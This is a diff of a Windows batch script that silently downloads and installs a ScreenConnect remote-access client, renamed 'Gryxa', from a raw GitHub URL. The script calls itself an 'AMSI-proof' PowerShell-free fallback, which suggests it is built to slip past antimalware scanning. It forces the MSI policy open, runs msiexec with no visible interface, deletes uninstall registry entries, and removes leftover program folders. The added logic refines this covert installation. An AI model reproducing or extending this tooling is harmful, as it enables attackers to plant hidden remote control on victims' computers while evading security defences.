@@ -1,6 +1,7 @@
 @echo off
-rem OWN_GRYXA BUILD 20260804G3 - PowerShell-free Gryxa install (AMSI-proof fallback)
-rem G3: NEVER /i while service exists; NEVER /x (TOCTOU); repo MSI only (no live ui.gryxa Upgrade MSI).
+rem OWN_GRYXA BUILD 20260804G4 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem G4: when service ABSENT but dir/ARP stuck, /x Gryxa ProductCode only then /i (fixes 1603).
+rem G3: NEVER /i while service exists; repo MSI only (no live ui.gryxa Upgrade MSI).
 rem G2: NEVER msiexec /x when service exists or START_PENDING.
 setlocal EnableExtensions EnableDelayedExpansion
 
@@ -18,6 +19,7 @@ set "CURL=%SystemRoot%\System32\curl.exe"
 set "MSI=%STAGE%\pkg_gryxa.msi"
 set "LOG=%WD%\own_gryxa.log"
 set "LOCK=%WD%\gryxa_msi.lock"
+set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
 set "URL1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
 set "SVC=ScreenConnect Client (%GRYXA_FP%)"
 
@@ -102,11 +104,24 @@ if not exist "%MSI%" (
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
 
-rem G3: no msiexec /x — ARP-only cleanup of phantom uninstall keys
-reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{9D7CC418-A356-9693-DCC5-41EC44D03B31}" /f >nul 2>&1
-reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{9D7CC418-A356-9693-DCC5-41EC44D03B31}" /f >nul 2>&1
+rem G3/G4: /x ONLY when Gryxa service fully absent (1060). Needed for STUCK dir/ARP → else /i returns 1603.
+sc query "%SVC%" >nul 2>&1
+if errorlevel 1 (
+  echo [%DATE% %TIME%] preclean_absent_x %PC%>>"%LOG%"
+  msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
+  reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
+  reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
+  if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" (
+    echo [%DATE% %TIME%] rmdir_stuck_pf86>>"%LOG%"
+    rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  )
+  if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" (
+    echo [%DATE% %TIME%] rmdir_stuck_pf>>"%LOG%"
+    rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  )
+)
 
-rem final race check
+rem final race check — if svc appeared, do not /i
 sc query "%SVC%" >nul 2>&1
 if not errorlevel 1 (
   echo [%DATE% %TIME%] race_svc_appeared_abort_i>>"%LOG%"
